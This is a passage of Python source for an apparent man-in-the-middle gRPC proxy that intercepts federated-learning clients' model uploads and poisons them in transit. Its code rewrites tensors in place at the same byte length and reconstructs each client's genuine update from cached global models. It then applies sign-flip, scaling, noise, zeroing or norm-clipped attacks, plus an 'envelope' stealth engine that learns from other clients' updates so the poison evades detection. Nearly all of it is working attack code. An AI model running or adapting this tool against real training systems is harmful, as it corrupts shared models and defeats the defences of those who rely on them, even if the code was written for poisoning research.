        parsed = parse_npy_at(view, position)
        if parsed is None:
            offset = position + 1
            continue
        data_offset, data_end, dtype, shape, fortran = parsed
        arrays_found += 1
        offset = data_end
        if not np.issubdtype(dtype, np.floating):
            continue
        raw_view = memoryview(view)[data_offset:data_end]
        try:
            flat = np.frombuffer(raw_view, dtype=dtype)
            array = flat.reshape(shape, order="F" if fortran else "C").copy()
        finally:
            try:
                raw_view.release()
            except Exception:
                pass
        specs.append((data_offset, data_end, dtype, shape, fortran))
        block.append(array)
    minimum_arrays = max(1, int(getattr(args, "model_min_float_arrays", 2)))
    minimum_elements = max(1, int(getattr(args, "model_min_elements", 1000)))
    element_count = sum(int(arr.size) for arr in block)
    if len(block) < minimum_arrays or element_count < minimum_elements:
        return [], [], arrays_found
    return block, specs, arrays_found


def write_model_block_to_payload(payload, specs, block):
    """Write reconstructed tensors without changing serialized length.

    Bytes inputs return a new bytes object. Mutable bytearray/mmap inputs are
    patched in place, avoiding a second full-message allocation for large
    model uploads.
    """
    if len(specs) != len(block):
        raise ValueError("tensor/spec count mismatch")
    mutable_in_place = isinstance(payload, bytearray) or isinstance(payload, mmap.mmap)
    output = payload if mutable_in_place else bytearray(payload)
    written = 0
    for (data_offset, data_end, dtype, shape, fortran), array in zip(specs, block):
        value = np.asarray(array, dtype=dtype)
        if tuple(value.shape) != tuple(shape):
            raise ValueError("tensor shape changed during reconstruction")
        encoded = value.tobytes(order="F" if fortran else "C")
        if len(encoded) != data_end - data_offset:
            raise ValueError("tensor byte length changed during reconstruction")
        output[data_offset:data_end] = encoded
        written += 1
    return (output if mutable_in_place else bytes(output)), written


def block_is_finite(block) -> bool:
    try:
        return all(bool(np.all(np.isfinite(np.asarray(arr)))) for arr in block)
    except Exception:
        return False


@dataclass
class StoredModelBlock:
    key: str
    model_hash: str
    contract_sha256: str
    signature: object
    signature_hash: str
    tensor_count: int
    total_elements: int
    total_bytes: int
    storage_mode: str
    in_memory_block: Optional[list]
    tensor_paths: List[Path]
    refcount: int
    created_at: float


class AdaptiveModelStore:
    """Deduplicated architecture-neutral global-model storage.

    Small models remain in RAM. Large models are written as individual .npy
    tensors and loaded with mmap on demand. Identical global models delivered
    to multiple clients share one stored copy keyed by model hash.
    """

    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.lock = threading.RLock()
        self.root = Path(
            str(getattr(args, "model_cache_dir", ".proxy_model_cache") or ".proxy_model_cache")
        ).expanduser().resolve()
        self.root.mkdir(parents=True, exist_ok=True)
        self.memory_threshold_bytes = max(
            1, int(getattr(args, "model_cache_memory_mb", 128) or 128)
        ) * 1024 * 1024
        self.disk_budget_bytes = max(
            1.0, float(getattr(args, "model_cache_disk_gb", 20.0) or 20.0)
        ) * 1024 * 1024 * 1024
        self.entries: Dict[str, StoredModelBlock] = {}

    def put(self, block) -> StoredModelBlock:
        model_hash = _block_hash(block)
        contract = tensor_contract(block)
        key = str(model_hash)
        with self.lock:
            existing = self.entries.get(key)
            if existing is not None:
                existing.refcount += 1
                return existing

        total_bytes = int(contract["total_bytes"])
        if total_bytes <= self.memory_threshold_bytes:
            stored = StoredModelBlock(
                key=key,
                model_hash=model_hash,
                contract_sha256=str(contract["sha256"]),
                signature=_tensor_signature(block),
                signature_hash=_signature_hash(block),
                tensor_count=len(block),
                total_elements=int(contract["total_elements"]),
                total_bytes=total_bytes,
                storage_mode="memory",
                in_memory_block=_clone_block(block),
                tensor_paths=[],
                refcount=1,
                created_at=time.time(),
            )
        else:
            model_dir = self.root / model_hash
            model_dir.mkdir(parents=True, exist_ok=True)
            tensor_paths: List[Path] = []
            for index, array in enumerate(block):
                path = model_dir / f"tensor_{index:05d}.npy"
                if not path.exists():
                    np.save(path, np.asarray(array), allow_pickle=False)
                tensor_paths.append(path)
            metadata = {
                "model_hash": model_hash,
                "contract": contract,
                "tensor_count": len(block),
                "total_bytes": total_bytes,
                "created_at": time.time(),
            }
            try:
                (model_dir / "contract.json").write_text(
                    json.dumps(metadata, indent=2), encoding="utf-8"
                )
            except Exception:
                pass
            stored = StoredModelBlock(
                key=key,
                model_hash=model_hash,
                contract_sha256=str(contract["sha256"]),
                signature=_tensor_signature(block),
                signature_hash=_signature_hash(block),
                tensor_count=len(block),
                total_elements=int(contract["total_elements"]),
                total_bytes=total_bytes,
                storage_mode="disk_mmap",
                in_memory_block=None,
                tensor_paths=tensor_paths,
                refcount=1,
                created_at=time.time(),
            )
        with self.lock:
            race = self.entries.get(key)
            if race is not None:
                race.refcount += 1
                if stored.storage_mode == "disk_mmap":
                    self._delete_disk_entry(stored)
                return race
            self.entries[key] = stored
        return stored

    def load(self, key: str):
        with self.lock:
            entry = self.entries.get(str(key))
            if entry is None:
                raise KeyError(f"model-store entry not found: {key}")
            if entry.storage_mode == "memory":
                return _clone_block(entry.in_memory_block)
            paths = list(entry.tensor_paths)
        # mmap_mode avoids reading every cached global tensor twice. The attack
        # arithmetic may still materialize an update, which is unavoidable for
        # whole-update attacks such as envelope projection.
        return [np.load(path, mmap_mode="r", allow_pickle=False) for path in paths]

    def release(self, key: str) -> None:
        with self.lock:
            entry = self.entries.get(str(key))
            if entry is None:
                return
            entry.refcount -= 1
            if entry.refcount > 0:
                return
            self.entries.pop(str(key), None)
        if entry.storage_mode == "disk_mmap":
            self._delete_disk_entry(entry)

    @staticmethod
    def _delete_disk_entry(entry: StoredModelBlock) -> None:
        directories = {path.parent for path in entry.tensor_paths}
        for path in entry.tensor_paths:
            try:
                path.unlink(missing_ok=True)
            except Exception:
                pass
        for directory in directories:
            try:
                for extra in directory.iterdir():
                    extra.unlink(missing_ok=True)
                directory.rmdir()
            except Exception:
                pass

    def disk_bytes(self) -> int:
        with self.lock:
            return int(
                sum(
                    entry.total_bytes
                    for entry in self.entries.values()
                    if entry.storage_mode == "disk_mmap"
                )
            )

    def snapshot(self) -> dict:
        with self.lock:
            return {
                "entry_count": len(self.entries),
                "disk_bytes": self.disk_bytes(),
                "memory_threshold_bytes": self.memory_threshold_bytes,
                "disk_budget_bytes": int(self.disk_budget_bytes),
                "entries": {
                    key: {
                        "storage_mode": entry.storage_mode,
                        "total_bytes": entry.total_bytes,
                        "tensor_count": entry.tensor_count,
                        "contract_sha256": entry.contract_sha256,
                        "refcount": entry.refcount,
                    }
                    for key, entry in self.entries.items()
                },
            }


@dataclass
class ModelSnapshot:
    client_ip: str
    storage_key: str
    signature: object
    signature_hash: str
    contract_sha256: str
    tensor_count: int
    total_elements: int
    total_bytes: int
    storage_mode: str
    model_hash: str
    observed_at: float
    round_value: object
    phase: str
    confidence: object
    source: str
    phase_qualified: bool
    message_index: int
    stream_id: int


class ClientModelCache:
    """Thread-safe cache of server-to-client global models.

    Matching is based on a dynamically discovered ordered tensor contract, not
    on architecture names, model classes, or fixed tensor counts.
    """

    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.lock = threading.RLock()
        self.entries: Dict[str, deque] = {}
        self.max_entries = max(2, int(getattr(args, "model_cache_entries_per_client", 12)))
        self.store_backend = AdaptiveModelStore(args)
        self.disk_budget_bytes = int(self.store_backend.disk_budget_bytes)

    @staticmethod
    def _round_equal(left, right) -> bool:
        try:
            return int(left) == int(right)
        except Exception:
            return str(left or "").strip() != "" and str(left) == str(right)

    def _release_snapshot(self, snapshot: ModelSnapshot) -> None:
        self.store_backend.release(snapshot.storage_key)

    def _prune_disk_budget(self) -> None:
        # Remove the oldest snapshot references until the deduplicated on-disk
        # model store is within budget. This is architecture-neutral and avoids
        # unbounded growth for transformer-scale models.
        while self.store_backend.disk_bytes() > self.disk_budget_bytes:
            oldest_client = None
            oldest_snapshot = None
            with self.lock:
                for client, queue in self.entries.items():
                    if not queue:
                        continue
                    candidate = queue[0]
                    if oldest_snapshot is None or candidate.observed_at < oldest_snapshot.observed_at:
                        oldest_client = client
                        oldest_snapshot = candidate
                if oldest_snapshot is None or oldest_client is None:
                    break
                self.entries[oldest_client].popleft()
            self._release_snapshot(oldest_snapshot)
            logger.warning(
                "[MODEL-CACHE] evicted oldest snapshot to respect disk budget: "
                "client=%s hash=%s bytes=%d",
                oldest_client,
                oldest_snapshot.model_hash[:12],
                oldest_snapshot.total_bytes,
            )

    def store(self, client_ip: str, block, message_index: int, stream_id: int) -> ModelSnapshot:
        snapshot = _phase_snapshot_for_client(client_ip, allow_global=True)
        confidence = snapshot.get("confidence")
        minimum = float(getattr(self.args, "download_phase_min_confidence", 0.70))
        rejected_sources = {
            item.strip().lower()
            for item in str(getattr(self.args, "phase_gate_reject_sources", "server_announce") or "").split(",")
            if item.strip()
        }
        source = str(snapshot.get("source", "") or "")
        phase_qualified = (
            _normalize_fl_phase(snapshot.get("phase", "UNKNOWN")) == "MODEL_DOWNLOAD"
            and confidence is not None
            and float(confidence) >= minimum
            and not any(token in source.lower() for token in rejected_sources)
        )
        stored = self.store_backend.put(block)
        entry = ModelSnapshot(
            client_ip=str(client_ip),
            storage_key=stored.key,
            signature=stored.signature,
            signature_hash=stored.signature_hash,
            contract_sha256=stored.contract_sha256,
            tensor_count=stored.tensor_count,
            total_elements=stored.total_elements,
            total_bytes=stored.total_bytes,
            storage_mode=stored.storage_mode,
            model_hash=stored.model_hash,
            observed_at=time.time(),
            round_value=snapshot.get("round", ""),
            phase=_normalize_fl_phase(snapshot.get("phase", "UNKNOWN")),
            confidence=confidence,
            source=str(snapshot.get("source", "") or ""),
            phase_qualified=bool(phase_qualified),
            message_index=int(message_index),
            stream_id=int(stream_id),
        )
        with self.lock:
            queue = self.entries.setdefault(str(client_ip), deque())
            if queue and queue[-1].model_hash == entry.model_hash:
                previous = queue.pop()
                self._release_snapshot(previous)
            queue.append(entry)
            while len(queue) > self.max_entries:
                evicted = queue.popleft()
                self._release_snapshot(evicted)
        self._prune_disk_budget()
        logger.info(
            "[%s] cached server model round=%s tensors=%d bytes=%d contract=%s "
            "phase=%s qualified=%s hash=%s storage=%s",
            client_ip,
            entry.round_value if entry.round_value not in (None, "") else "?",
            entry.tensor_count,
            entry.total_bytes,
            entry.contract_sha256[:12],
            entry.phase,
            entry.phase_qualified,
            entry.model_hash[:12],
            entry.storage_mode,
        )
        return entry

    def match(self, client_ip: str, local_block, requested_round=None):
        now = time.time()
        maximum_age = float(getattr(self.args, "global_model_max_age_s", 600.0))
        strict_round = bool(getattr(self.args, "require_global_round_match", False))
        contract = tensor_contract(local_block)
        contract_hash = str(contract["sha256"])
        with self.lock:
            all_entries = list(self.entries.get(str(client_ip), deque()))
        candidates = [
            entry for entry in all_entries
            if entry.contract_sha256 == contract_hash
            and now - entry.observed_at <= maximum_age
        ]
        exact = []
        if requested_round not in (None, ""):
            exact = [entry for entry in candidates if self._round_equal(entry.round_value, requested_round)]
        if strict_round and requested_round not in (None, "") and not exact:
            return None, "strict_round_match_failed", len(candidates)
        pool = exact if exact else candidates
        if not pool:
            return None, "no_compatible_cached_global_model", len(candidates)
        pool.sort(key=lambda entry: (int(entry.phase_qualified), entry.observed_at), reverse=True)
        selected = pool[0]
        if exact:
            method = "exact_round_contract"
        elif selected.phase_qualified:
            method = "latest_phase_qualified_contract"
        else:
            method = "latest_contract"
        return selected, method, len(candidates)

    def load_snapshot(self, snapshot: ModelSnapshot):
        return self.store_backend.load(snapshot.storage_key)

    def snapshot(self) -> dict:
        with self.lock:
            client_entries = {
                client: [
                    {
                        "round": entry.round_value,
                        "age_s": max(0.0, time.time() - entry.observed_at),
                        "hash": entry.model_hash,
                        "contract_sha256": entry.contract_sha256,
                        "tensor_count": entry.tensor_count,
                        "total_bytes": entry.total_bytes,
                        "storage_mode": entry.storage_mode,
                        "phase": entry.phase,
                        "phase_qualified": entry.phase_qualified,
                    }
                    for entry in queue
                ]
                for client, queue in self.entries.items()
            }
        return {
            "clients": client_entries,
            "store": self.store_backend.snapshot(),
        }


def get_model_cache(args: argparse.Namespace) -> ClientModelCache:
    cache = getattr(args, "_client_model_cache", None)
    if cache is None:
        cache = ClientModelCache(args)
        args._client_model_cache = cache
    return cache


def apply_direct_attack_to_update(genuine_update, args: argparse.Namespace, rng):
    """Create a poisoned update in true update space.

    Important distinction:
      * sign_flip:      -alpha * genuine_update
      * scale:           alpha * genuine_update
      * clip:           sign-flipped update with controlled global norm
                         ||poison|| = live_clip_ratio * ||genuine||
                         and cosine(genuine, poison) ≈ -1

    The clip mode is therefore a constrain-and-scale poisoning attack, not
    coordinate-wise np.clip and not a shrinkage of the honest update.
    """
    attack = str(getattr(args, "live_attack", "sign_flip"))
    alpha = float(getattr(args, "live_alpha", 1.0))
    sigma = float(getattr(args, "live_sigma", 0.01))
    output = []

    if attack == "clip":
        clip_ratio = abs(float(getattr(args, "live_clip_ratio", 0.3)))
        if clip_ratio <= 0.0:
            clip_ratio = 0.3

        # First choose an adversarial direction. For this attack family the
        # direction is the sign-flipped genuine update.
        raw_poison = [(-1.0 * np.asarray(array, dtype=np.float64)) for array in genuine_update]

        genuine_norm = float(np.sqrt(
            sum(float(np.sum(np.asarray(array, dtype=np.float64) ** 2)) for array in genuine_update)
        ))
        raw_norm = float(np.sqrt(
            sum(float(np.sum(np.asarray(array, dtype=np.float64) ** 2)) for array in raw_poison)
        ))

        if genuine_norm <= 1e-12 or raw_norm <= 1e-12:
            output = [np.asarray(array).copy() for array in genuine_update]
        else:
            target_norm = clip_ratio * genuine_norm
            scale = target_norm / raw_norm
            output = [
                (scale * poison_array).astype(original.dtype)
                for poison_array, original in zip(raw_poison, genuine_update)
            ]

        _assert_wire_compatible(genuine_update, output)
        return output

    for array in genuine_update:
        value = np.asarray(array, dtype=np.float64)
        if attack == "sign_flip":
            changed = -alpha * value
        elif attack == "scale":
            changed = alpha * value
        elif attack == "noise":
            changed = value + rng.normal(0.0, sigma, size=value.shape)
        elif attack == "zero":
            changed = np.zeros_like(value)
        else:
            raise ValueError(f"unsupported update-space attack: {attack}")
        output.append(changed.astype(array.dtype))

    _assert_wire_compatible(genuine_update, output)
    return output

def process_update_space_upload(
    payload: bytes,
    *,
    client_ip: str,
    message_index: int,
    stream_id: int,
    args: argparse.Namespace,
    rng,
    allow_modify: bool = True,
):
    """Return (payload, modified, reason, details, arrays_found, arrays_written)."""
    details = {
        "update_space_required": int(bool(getattr(args, "require_update_space", True))),
        "update_space_used": 0,
        "global_model_cached": 0,
        "global_model_matched": 0,
        "reconstruction_valid": 0,
        "finite_values_valid": 0,
        "wire_compatible": 0,
    }
    # Parsing is observational and safe, so do it before the phase decision.
    # This lets the log distinguish a missed true model upload from a control
    # message that merely arrived while MODEL_UPLOAD was predicted.
    local_block, specs, arrays_found = extract_float_model_block(payload, args)
    if local_block:
        details.update({
            "tensor_count": len(local_block),
            "tensor_signature_hash": _signature_hash(local_block),
            "local_model_hash": _block_hash(local_block),
        })
        details.update(contract_summary_fields(local_block))

    gate_open, gate_reason, gate_details = evaluate_phase_gate(args, client_ip, "MODEL_UPLOAD")
    details.update(gate_details)
    if not gate_open:
        return payload, False, f"phase_gate_{gate_reason}", details, arrays_found, 0
    if not local_block:
        return payload, False, "no_complete_model_block_found", details, arrays_found, 0
    cache = get_model_cache(args)
    requested_round = gate_details.get("phase_prediction_round", "")
    snapshot, match_method, candidate_count = cache.match(client_ip, local_block, requested_round)
    details["model_cache_candidates"] = candidate_count
    details["global_model_match_method"] = match_method
    if snapshot is None:
        if bool(getattr(args, "require_update_space", True)):
            return payload, False, match_method, details, arrays_found, 0
        # V24 intentionally does not silently fall back to full-weight poisoning.
        return payload, False, "update_space_unavailable_no_weight_space_fallback", details, arrays_found, 0

    details.update({
        "global_model_cached": 1,
        "global_model_matched": 1,
        "global_model_age_s": max(0.0, time.time() - snapshot.observed_at),
        "global_model_round": snapshot.round_value,
        "global_model_message_index": snapshot.message_index,
        "global_model_stream_id": snapshot.stream_id,
        "global_model_phase_qualified": int(snapshot.phase_qualified),
        "global_model_phase_at_cache": snapshot.phase,
        "global_model_cache_source": snapshot.source,
        "global_model_match_valid": 1,
        "global_model_phase_status": (
            "phase_qualified" if snapshot.phase_qualified else "matched_but_phase_unqualified"
        ),
        "global_model_hash": snapshot.model_hash,
        "global_model_contract_sha256": snapshot.contract_sha256,
        "global_model_tensor_count": snapshot.tensor_count,
        "global_model_total_bytes": snapshot.total_bytes,
        "global_model_storage_mode": snapshot.storage_mode,
    })

    try:
        global_block = cache.load_snapshot(snapshot)
        _assert_same_structure(local_block, global_block)
        genuine_update = _subtract_blocks(local_block, global_block)
        details["update_space_used"] = 1
        details["canonical_hash_scheme"] = CANONICAL_HASH_SCHEME
        details["genuine_update_sha256"] = canonical_ndarrays_sha256(genuine_update)
        genuine_metrics = _update_metrics(
            genuine_update,
            epsilon=float(getattr(args, "update_sparsity_epsilon", 1e-8)),
        )
        details.update({
            "update_dimension": genuine_metrics.get("dimension", ""),
            "genuine_update_l1_norm": genuine_metrics.get("l1_norm", ""),
            "genuine_update_l2_norm": genuine_metrics.get("l2_norm", ""),
            "genuine_update_max_abs": genuine_metrics.get("max_abs", ""),
            "genuine_update_zero_fraction": genuine_metrics.get("zero_fraction", ""),
            "genuine_update_near_zero_fraction": genuine_metrics.get("near_zero_fraction", ""),
            "genuine_update_mean": genuine_metrics.get("mean", ""),
            "genuine_update_std": genuine_metrics.get("std", ""),
            "genuine_update_minimum": genuine_metrics.get("minimum", ""),
            "genuine_update_maximum": genuine_metrics.get("maximum", ""),
            "genuine_tensor_l2_norms_json": genuine_metrics.get("tensor_l2_norms_json", ""),
        })

        # V27: every visible client's genuine update is offered to the shared
        # peer registry before any target-specific modification. This lets a
        # target engine build a true cross-client envelope rather than learning
        # only from the target's own history. Contract and update hashes prevent
        # cross-model contamination and duplicate observations.
        contract_sha = str(
            details.get("model_contract_sha256", "")
            or snapshot.contract_sha256
            or ""
        )
        round_value = requested_round
        try:
            round_index = int(round_value)
        except Exception:
            try:
                round_index = int(details.get("global_model_round", ""))
            except Exception:
                round_index = int(message_index) + 1
        if _observe_peer_update is not None:
            try:
                peer_observation = _observe_peer_update(
                    args,
                    client_id=client_ip,
                    round_index=round_index,
                    genuine_update=genuine_update,
                    model_contract_sha256=contract_sha,
                    observation_id=str(details.get("genuine_update_sha256", "") or ""),
                )
                details.update(peer_observation)
            except Exception as peer_exc:
                details["peer_observation_recorded"] = 0
                details["peer_observation_reason"] = f"error:{type(peer_exc).__name__}"
                details["peer_observation_error"] = str(peer_exc)
        else:
            details["peer_observation_recorded"] = 0
            details["peer_observation_reason"] = "peer_registry_unavailable"

        if not allow_modify:
            observed = int(details.get("peer_observation_recorded", 0) or 0) > 0
            return (
                payload,
                False,
                "peer_observation_recorded" if observed else "peer_observation_unavailable",
                details,
                arrays_found,
                0,
            )

        if str(getattr(args, "live_attack", "")) == "envelope":
            if not _STEALTH_AVAILABLE:
                return payload, False, "update_space_engine_unavailable", details, arrays_found, 0
            engine = _get_client_stealth_engine(args, client_ip, contract_sha)
            projected_update, engine_details = engine.process_update(
                genuine_update,
                round_index=round_index,
                model_contract_sha256=contract_sha,
                genuine_update_sha256=str(details.get("genuine_update_sha256", "") or ""),
            )
            details.update(engine_details)
            dashboard_update_engine(engine)
            if projected_update is None:
                reason = str(engine_details.get("engine_decision", "warmup_or_no_change"))
                return payload, False, reason, details, arrays_found, 0

            # Exact raw-candidate fingerprint is available for deterministic
            # own-update attacks. Peer-based/noise attacks leave this field blank
            # unless the attack engine itself exposes the raw candidate later.
            raw_kind = str(getattr(args, "live_raw_attack", "") or "").lower()
            alpha = float(getattr(args, "live_alpha", 1.0))
            raw_candidate = None
            if raw_kind == "sign_flip":
                raw_candidate = [
                    (-alpha * np.asarray(array, dtype=np.float64)).astype(np.asarray(array).dtype)
                    for array in genuine_update
                ]
            elif raw_kind == "scale":
                raw_candidate = [
                    (alpha * np.asarray(array, dtype=np.float64)).astype(np.asarray(array).dtype)
                    for array in genuine_update
                ]
            if raw_candidate is not None:
                details["raw_poison_update_sha256"] = canonical_ndarrays_sha256(raw_candidate)

            poisoned_update = projected_update
            details["projected_update_sha256"] = canonical_ndarrays_sha256(poisoned_update)
        else:
            poisoned_update = apply_direct_attack_to_update(genuine_update, args, rng)
            direct_hash = canonical_ndarrays_sha256(poisoned_update)
            details["raw_poison_update_sha256"] = direct_hash
            details["projected_update_sha256"] = direct_hash
            raw_metrics = _update_metrics(
                poisoned_update,
                epsilon=float(getattr(args, "update_sparsity_epsilon", 1e-8)),
            )
            details.update({
                "raw_poison_update_l1_norm": raw_metrics.get("l1_norm", ""),
                "raw_poison_update_l2_norm": raw_metrics.get("l2_norm", ""),
                "raw_poison_update_max_abs": raw_metrics.get("max_abs", ""),
                "raw_poison_update_near_zero_fraction": raw_metrics.get("near_zero_fraction", ""),
                "projected_update_l1_norm": raw_metrics.get("l1_norm", ""),
                "projected_update_l2_norm": raw_metrics.get("l2_norm", ""),
                "projected_update_max_abs": raw_metrics.get("max_abs", ""),
                "projected_update_zero_fraction": raw_metrics.get("zero_fraction", ""),
                "projected_update_near_zero_fraction": raw_metrics.get("near_zero_fraction", ""),
                "projected_tensor_l2_norms_json": raw_metrics.get("tensor_l2_norms_json", ""),
                "distance_genuine_to_raw_poison": _block_euclidean_distance(genuine_update, poisoned_update),
                "cosine_genuine_to_raw_poison": _block_cosine_similarity(genuine_update, poisoned_update),
                "distance_genuine_to_projected_update": _block_euclidean_distance(genuine_update, poisoned_update),
                "cosine_genuine_to_projected_update": _block_cosine_similarity(genuine_update, poisoned_update),
                "projected_to_genuine_norm_ratio": _block_l2_norm(poisoned_update) / (_block_l2_norm(genuine_update) + 1e-12),
                "engine_decision": "direct_update_space_attack_generated",
            })

        reconstructed = _add_blocks(global_block, poisoned_update)
        details["finite_values_valid"] = int(block_is_finite(reconstructed))
        if not details["finite_values_valid"]:
            return payload, False, "nonfinite_reconstructed_model", details, arrays_found, 0
        _assert_wire_compatible(local_block, reconstructed)
        details["wire_compatible"] = 1
        details["reconstructed_model_l2_norm"] = _block_l2_norm(reconstructed)
        details["poisoned_model_hash"] = _block_hash(reconstructed)
        details["reconstructed_model_sha256"] = canonical_ndarrays_sha256(reconstructed)
        changed_update = any(
            not np.array_equal(np.asarray(left), np.asarray(right))
            for left, right in zip(local_block, reconstructed)
        )
        new_payload, arrays_written = write_model_block_to_payload(payload, specs, reconstructed)
        if len(new_payload) != len(payload):
            return payload, False, "length_change_reverted", details, arrays_found, 0
        details["reconstruction_valid"] = 1
        modified = bool(changed_update and arrays_written > 0)
        return (
            new_payload,
            modified,
            "update_space_poison_applied" if modified else "reconstructed_payload_unchanged",
            details,
            arrays_found,
            arrays_written if modified else 0,
        )
    except Exception as exc:
        logger.warning("[%s] update-space processing failed: %s", client_ip, exc)
        details["engine_decision"] = f"fail_open:{type(exc).__name__}"
        return payload, False, "update_space_processing_failed", details, arrays_found, 0


def poison_array_bytes_in_place(out: bytearray, data_offset: int, data_end: int, dtype, args: argparse.Namespace, rng) -> bool:
    old = bytes(out[data_offset:data_end])
    arr = np.frombuffer(old, dtype=dtype).copy()
    attack = args.live_attack
    if attack == "sign_flip":
        arr = -float(args.live_alpha) * arr
    elif attack == "scale":
        arr = float(args.live_alpha) * arr
    elif attack == "noise":
        arr = arr + rng.normal(0.0, float(args.live_sigma), size=arr.shape).astype(dtype)
    elif attack == "zero":
        arr = np.zeros_like(arr)
    elif attack == "clip":
        # Do not use byte-level coordinate clipping for the clip attack.
        # It is a no-op at FL update scale and bypasses the update-space
        # global-model matching needed for a controlled adversarial update.
        return False
    else:
        return False
    new = arr.astype(dtype, copy=False).tobytes(order="C")
    if len(new) != len(old):
        return False
    out[data_offset:data_end] = new
    return True


def selected_live_message(msg_index: int, args: argparse.Namespace) -> bool:
    if msg_index < int(args.live_start_message):
        return False
    if int(args.live_end_message) >= 0 and msg_index > int(args.live_end_message):
        return False
    return True


def poison_grpc_payload(payload: bytes, msg_index: int, args: argparse.Namespace, counters: LivePoisonCounters, rng) -> bytes:
    """Modify embedded NumPy .npy arrays in a gRPC protobuf payload without changing length."""
    if np is None:
        raise RuntimeError("live poisoning requires numpy; install numpy in this environment")
    counters.grpc_messages_seen += 1
    if not selected_live_message(msg_index, args):
        counters.selected_messages_skipped += 1
        return payload

    out = bytearray(payload)
    offset = 0
    arrays_this_msg = 0
    modified_this_msg = 0
    max_arrays = int(args.live_max_arrays_per_message)

    while True:
        pos = out.find(NPY_MAGIC, offset)
        if pos < 0:
            break
        parsed = parse_npy_at(out, pos)
        if parsed is None:
            counters.parse_errors += 1
            offset = pos + 1
            continue
        data_offset, data_end, dtype, _shape, _fortran_order = parsed
        counters.arrays_found += 1
        arrays_this_msg += 1
        if (not np.issubdtype(dtype, np.floating)) and (not args.live_include_nonfloat):
            counters.nonfloat_arrays_skipped += 1
            offset = data_end
            continue
        if max_arrays > 0 and modified_this_msg >= max_arrays:
            offset = data_end
            continue
        if poison_array_bytes_in_place(out, data_offset, data_end, dtype, args, rng):
            modified_this_msg += 1
            counters.arrays_modified += 1
        offset = data_end

    if modified_this_msg > 0:
        counters.grpc_messages_modified += 1
        if args.live_log_every > 0 and (counters.grpc_messages_modified <= 5 or counters.grpc_messages_modified % args.live_log_every == 0):
            logger.info(
                "LIVE-POISON message=%d arrays_found_in_msg=%d arrays_modified_in_msg=%d total_modified_messages=%d total_modified_arrays=%d attack=%s alpha=%.4f sigma=%.6f",
                msg_index,
                arrays_this_msg,
                modified_this_msg,
                counters.grpc_messages_modified,
                counters.arrays_modified,
                args.live_attack,
                args.live_alpha,
                args.live_sigma,
            )
    return bytes(out)


@dataclass
class PendingDataFrame:
    payload_len: int
    flags: int
    stream_id: int



def get_message_policy(args: argparse.Namespace) -> MessageSizePolicy:
    policy = getattr(args, "_message_size_policy", None)
    if policy is None:
        policy = MessageSizePolicy(
            max_message_mb=int(getattr(args, "max_message_mb", 0) or 0),
            hard_max_message_gb=float(getattr(args, "hard_max_message_gb", 8.0) or 8.0),
            spool_threshold_mb=int(getattr(args, "spool_threshold_mb", 32) or 32),
            spool_dir=str(getattr(args, "spool_dir", ".proxy_spool") or ".proxy_spool"),
            disk_reserve_mb=int(getattr(args, "spool_disk_reserve_mb", 1024) or 1024),
        )
        args._message_size_policy = policy
    return policy


@dataclass
class LargeGrpcMessageState:
    prefix: bytes
    compressed: int
    msg_len: int
    path: Path
    handle: object
    received: int
    policy_reason: str


class GrpcStreamRewriter:
    """Architecture-neutral HTTP/2/gRPC DATA-stream rewriter.

    Small messages remain in memory. Large messages are spooled to disk and
    patched in place. While DATA is withheld, a FlowControlBridge grants
    temporary HTTP/2 credit to the client and later suppresses equivalent
    server WINDOW_UPDATE credit, preventing large-model uploads from stalling.
    """

    def __init__(
        self,
        args: argparse.Namespace,
        counters: LivePoisonCounters,
        rng,
        client_ip: str = "",
        stream_id: int = 0,
        flow_bridge: Optional[FlowControlBridge] = None,
        client_sock: Optional[socket.socket] = None,
    ):
        self.args = args
        self.counters = counters
        self.rng = rng
        self.client_ip = client_ip
        self.stream_id = int(stream_id or 0)
        self.flow_bridge = flow_bridge
        self.client_sock = client_sock
        self.policy = get_message_policy(args)
        self.poison_this_client, self.target_source, self.target_meta = poison_target_decision(client_ip, args)
        if not self.poison_this_client and client_ip:
            logger.debug(
                "[%s] non-target observer instantiated; analyzer phase/status alone "
                "does not authorize poisoning",
                client_ip,
            )
        self.inbuf = bytearray()
        self.output = AdaptiveOutputQueue()
        self.pending_frames: List[PendingDataFrame] = []
        self.large_state: Optional[LargeGrpcMessageState] = None
        self.message_index = 0

    def _resync_to_next_npy(self) -> bool:
        position = self.inbuf.find(NPY_MAGIC, 1)
        if position < 0:
            if self.inbuf:
                self.output.append_bytes(bytes(self.inbuf[:1]))
                del self.inbuf[:1]
            return False
        prefix_start = max(0, position - 5)
        if prefix_start > 0:
            self.output.append_bytes(bytes(self.inbuf[:prefix_start]))
            del self.inbuf[:prefix_start]
        self.counters.parse_errors += 1
        return True

    def _base_transport_details(self, msg_len: int, mode: str) -> dict:
        details = {
            "grpc_message_size_bytes": int(msg_len),
            "message_size_policy": (
                "adaptive_no_soft_cap"
                if int(getattr(self.args, "max_message_mb", 0) or 0) == 0
                else "operator_soft_cap_plus_hard_safety_limit"
            ),
            "adaptive_hard_limit_bytes": int(self.policy.hard_limit_bytes),
            "transport_buffer_mode": str(mode),
            "transport_spooled_to_disk": int(mode == "disk_spool"),
            "transport_spool_bytes": int(msg_len if mode == "disk_spool" else 0),
        }
        if self.flow_bridge is not None:
            details.update(self.flow_bridge.snapshot())
        return details

    def _process_complete_payload(self, payload, *, compressed: int, msg_len: int, mode: str):
        selected = selected_live_message(self.message_index, self.args)
        modified = False
        reason = "relayed_unchanged"
        details = self._base_transport_details(msg_len, mode)
        arrays_found_message = 0
        arrays_modified_message = 0
        self.counters.grpc_messages_seen += 1
        message_targeted, target_source, target_meta = poison_target_decision(self.client_ip, self.args)
        self.poison_this_client = bool(message_targeted)

        if compressed != 0:
            self.counters.compressed_messages_skipped += 1
            new_payload = payload
            reason = "compressed_message_skipped"
        elif not message_targeted:
            # V27 peer-learning path: for envelope experiments, non-target
            # uploads are still parsed observationally so the shared registry
            # learns genuine cross-client geometry. Bytes are never modified.
            if (
                bool(getattr(self.args, "live_poison", False))
                and str(getattr(self.args, "live_attack", "")).lower() == "envelope"
            ):
                rewrite_started = time.perf_counter()
                (
                    _unchanged_payload,
                    _modified_unused,
                    reason,
                    observation_details,
                    arrays_found_message,
                    _arrays_written_unused,
                ) = process_update_space_upload(
                    payload,
                    client_ip=self.client_ip,
                    message_index=self.message_index,
                    stream_id=self.stream_id,
                    args=self.args,
                    rng=self.rng,
                    allow_modify=False,
                )
                new_payload = payload
                modified = False
                details.update(observation_details)
                details["rewrite_processing_duration_s"] = round(
                    max(0.0, time.perf_counter() - rewrite_started), 6
                )
